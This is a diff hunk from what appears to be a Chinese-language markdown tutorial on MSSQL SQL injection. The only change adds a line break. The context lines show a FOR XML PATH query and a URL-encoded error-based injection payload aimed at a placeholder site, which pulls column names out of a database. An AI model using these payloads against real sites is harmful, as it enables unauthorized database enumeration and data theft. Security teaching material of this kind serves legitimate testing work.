@@ -152,7 +152,7 @@ xxx.com?abc=a%27%0aand%0a1=(select%0aname%2b%27,%27%0afrom%0a(SELECT%0aName%0aFR
 ```html
 SELECT column_name+',' FROM(SELECT column_name from dbo.table_name)a FOR  XML PATH('')
 ```
-这里column_name指的是字段名,table_name指的是表名   
+这里column_name指的是字段名,table_name指的是表名   <br>
 运用到实战
 ```html
 xxx.com?abc=a%27%0aand%0a1=(SELECT%0atop%0a5%0acolumn_name%2b%27,%27%0aFROM(SELECT%0acolumn_name%0afrom%0adbo.table_name)a%0aFOR%0a%0aXML%0aPATH(%27%27))%0aand%0a%271%27=%271
